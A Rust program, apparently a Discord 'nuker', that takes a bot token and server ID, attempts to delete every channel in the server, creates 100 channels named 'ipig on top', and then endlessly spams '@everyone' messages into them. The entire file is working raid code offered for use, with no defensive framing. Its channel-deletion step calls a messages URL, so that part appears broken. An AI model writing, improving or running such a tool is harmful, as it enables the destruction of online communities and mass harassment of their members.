use ansi_term::Colour;
use futures::future::join_all;
use reqwest;
use reqwest::Client;
use serde::Deserialize;
use std::io;
use tokio;

#[derive(Deserialize, Debug)]
struct Channel {
    id: String,
}

impl Channel {
    fn get_message_url(self) -> &'static str {
        format!("https://discord.com/api/v9/channels/{}/messages", self.id).leak()
    }
}

static mut TOKEN: &str = "";
const ART: &str = r#"

███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░░█████╗░██████╗░██████╗░░█████╗░  ███████╗░█████╗░██████╗░
████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗██╔══██╗╚════██╗╚════██╗██╔══██╗  ██╔════╝██╔══██╗██╔══██╗
██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝██║░░██║░█████╔╝░░███╔═╝╚█████╔╝  █████╗░░██║░░██║██████╔╝
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗██║░░██║░╚═══██╗██╔══╝░░██╔══██╗  ██╔══╝░░██║░░██║██╔══██╗
██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║╚█████╔╝██████╔╝███████╗╚█████╔╝  ██║░░░░░╚█████╔╝██║░░██║
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═════╝░╚══════╝░╚════╝░  ╚═╝░░░░░░╚════╝░╚═╝░░╚═╝

██████╗░██╗░██████╗░█████╗░░█████╗░██████╗░██████╗░
██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██║░░██║██║╚█████╗░██║░░╚═╝██║░░██║██████╔╝██║░░██║
██║░░██║██║░╚═══██╗██║░░██╗██║░░██║██╔══██╗██║░░██║
██████╔╝██║██████╔╝╚█████╔╝╚█████╔╝██║░░██║██████╔╝
╚═════╝░╚═╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═════╝░
"#;

#[tokio::main]
async fn main() -> Result<(), reqwest::Error> {
    println!("{}", Colour::Blue.paint(ART));
    let token = input("Enter Token: ");
    unsafe {
        TOKEN = format!("Bot {token}").leak();
    }

    let id = input("Enter Guild ID: ");
    let guild_url: &'static str = format!("https://discord.com/api/v9/guilds/{id}/channels").leak();

    let body = serde_json::json!({"content": "@everyone"});
    let create_channel_body = serde_json::json!({"name": "ipig on top"});

    let client = Client::new();

    // get channels
    println!(" ==== getting channels ==== ");
    let channels: Vec<Channel> = client
        .get(guild_url)
        .header("Authorization", unsafe { TOKEN })
        .send()
        .await?
        .json()
        .await?;

    // delete channels
    println!(" ==== deleting channels ==== ");
    join_all(
        channels
            .into_iter()
            .map(|channel| delete_channel(client.clone(), channel.get_message_url())),
    ).await;

    // create channels
    println!(" ==== creating channels ==== ");
    let created_channels: Result<Vec<Channel>, _> = join_all(
        (0..100).map(|_| create_channel(
            client.clone(),
            guild_url,
            create_channel_body.clone()
        ))
    ).await
        .into_iter()
        .collect();

    let urls: Box<[&str]> = created_channels?
        .into_iter()
        .map(|channel| channel.get_message_url()).collect();
    
    // create messages
    println!(" ==== spamming messages ==== ");
    loop {
        for url in urls.into_iter() {
            tokio::spawn(create_message(client.clone(), url, body.clone()));
        }
    }
}

async fn delete_channel(
    client: Client,
    url: &'static str
) {
    let _ = client
        .delete(url)
        .header("Authorization", unsafe { TOKEN })
        .send()
        .await;
}

async fn create_message(
    client: Client,
    url: &'static str,
    body: serde_json::Value,
) {
    let _ = client
        .post(url)
        .header("Authorization", unsafe { TOKEN })
        .json(&body)
        .send()
        .await;
}

async fn create_channel(
    client: Client,
    url: &'static str,
    body: serde_json::Value,
) -> Result<Channel, reqwest::Error> {
    let text = client
        .post(url)
        .header("Authorization", unsafe { TOKEN })
        .json(&body)
        .send()
        .await?
        .text()
        .await?;
    

    Ok(serde_json::from_str(&text).unwrap())
}

fn input(hint: &str) -> String {
    println!("{}", Colour::Blue.paint(hint));
    let mut buf = String::new();
    let _ = io::stdin().read_line(&mut buf).unwrap();
    return buf.trim().to_string();
}
